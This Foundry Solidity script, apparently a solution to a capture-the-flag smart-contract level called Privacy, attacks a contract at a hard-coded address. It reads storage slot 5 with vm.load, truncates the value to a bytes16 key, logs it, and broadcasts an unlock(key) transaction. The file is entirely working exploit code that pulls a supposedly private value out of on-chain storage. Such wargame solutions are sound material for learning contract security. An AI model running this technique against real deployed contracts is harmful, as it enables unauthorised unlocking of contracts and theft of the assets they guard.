//SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

import {Script, console} from "forge-std/Script.sol";
import {Privacy} from "../src/Privacy.sol";

contract AttackPrivacy is Script {
    address privacyAddress = 0x5C8F41dA3b6014cdD8BF619aC4D1FDA362953F9a;

    function run() public {
        bytes32 byte_x = vm.load(privacyAddress, bytes32(uint256(5)));
        bytes16 key = bytes16(byte_x);

        console.log("Extracted Key: ");
        console.logBytes16(key);

        vm.startBroadcast();
        Privacy(privacyAddress).unlock(key);
        vm.stopBroadcast();
    }
}
